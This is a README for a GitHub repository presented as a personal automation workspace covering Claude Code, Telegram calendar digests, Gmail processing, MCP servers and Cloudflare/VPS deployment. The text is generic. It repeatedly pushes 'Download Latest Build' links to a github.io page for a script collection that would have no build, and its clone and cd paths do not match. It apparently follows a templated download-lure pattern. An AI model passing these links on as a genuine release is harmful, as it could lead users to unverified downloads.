# personal-stuff v2026 - personal project workspace 2026

> **A personal workspace for tools, automations, and deployment workflows across Cloudflare Workers and VPS, centered on Claude Code, Google Workspace, Telegram digests, and day-to-day infrastructure tasks.**

[![Platform](https://img.shields.io/badge/Platform-Cloudflare%20Workers%20and%20VPS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tombrooks32/personal-stuff-automation-hub?style=flat-square)](https://github.com/tombrooks32/personal-stuff-automation-hub)

---

<p align="center">
  <a href="https://tombrooks32.github.io/personal-stuff-automation-hub/">
    <img src="https://img.shields.io/badge/Download-personal--stuff%20Latest-brightgreen?style=for-the-badge" alt="Download personal-stuff">
  </a>
</p>

> **[Direct Download - personal-stuff v2026](https://tombrooks32.github.io/personal-stuff-automation-hub/)**

---

[Download Latest Build](https://tombrooks32.github.io/personal-stuff-automation-hub/)

---

## What personal-stuff is for

personal-stuff serves as a single place to keep personal scripts, projects, and the support pieces that make them run. It groups together automation, utility commands, and deployment-related assets that can be used in both local and hosted environments.

Rather than acting like one self-contained application, the repository is organized around practical personal operations. Inside you will find Claude-oriented workflow ideas, automations for mail and planning, calendar-to-Telegram digest delivery, and companion tooling for services such as Google Workspace and VPS-hosted systems.

---

## Included capabilities

- A central home for personal projects and infrastructure work
- Tooling and workflow support driven by Claude
- Automation that turns daily calendar activity into Telegram digests
- Gmail digest preference handling and delivery logic
- MCP servers for connected tool-based workflows
- CLI utilities for routine personal automation
- Deployment support for Cloudflare Workers
- VPS deployment support, including Hostinger-based setups

---

## Installation

You can clone the repository or grab the latest build, then drop it into the workspace you prefer.

git clone https://github.com/tombrooks32/personal-stuff-automation-hub.git
cd personal-stuff

Once it is in place, start the script, tool, or deployment workflow you need from the repository directory, depending on which part of the workspace you want to use.

---

## Using the workspace

Treat this repository as a base for keeping automations, service links, and helper utilities organized.

Typical workflow:
1. Choose the tool or workflow you need, such as calendar digests, email processing, or MCP-related helpers.
2. Set up the service connection you plan to use, such as Google Workspace, Telegram, Cloudflare, or a VPS target.
3. Run the matching script, CLI entry point, or deployment step for that component.
4. Check the output and refine the settings as your workflow evolves.

For Claude Code-based tasks, keep the relevant project context together with the automation files so prompts and edits stay aligned with the same workspace.

---

## Configuration

What you configure depends on the tool or workflow in use. In most cases, settings live in environment variables, workflow files, or service-specific config files stored in the repository.

Example environment layout:

    TELEGRAM_BOT_TOKEN=
    TELEGRAM_CHAT_ID=
    GOOGLE_WORKSPACE_ACCOUNT=
    VPS_HOST=
    CLOUDflare_WORKERS_ENV=

Use the appropriate values and filenames for the component you are running.

---

## Requirements

- Cloudflare Workers or a VPS environment, depending on the deployment target
- Access to the connected services used by each workflow
- Google Workspace credentials for email and planner-related automations
- Telegram access for digest delivery
- A VPS provider when using server-based deployment paths, such as Hostinger
- A runtime that matches the specific scripts or tools included in the workspace

---

## FAQ

**What is this repository meant to do?**  
It is designed as a personal workspace for automation, infrastructure support, and connected tools, not as a single-purpose app.

**Is there more than one workflow here?**  
Yes. The repository points to email workflows, calendar digests, MCP servers, CLI tools, and deployment support.

**Where are the settings kept?**  
Look in environment variables, workflow definitions, and any service-specific files provided by the component you are using.

**What should I check if a digest or deployment fails?**  
Confirm the connected account details, make sure the target service is available, and verify the configuration values for that workflow.

**How do I stay current?**  
Pull the latest repository changes and review workflow updates before running the tool or deployment again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
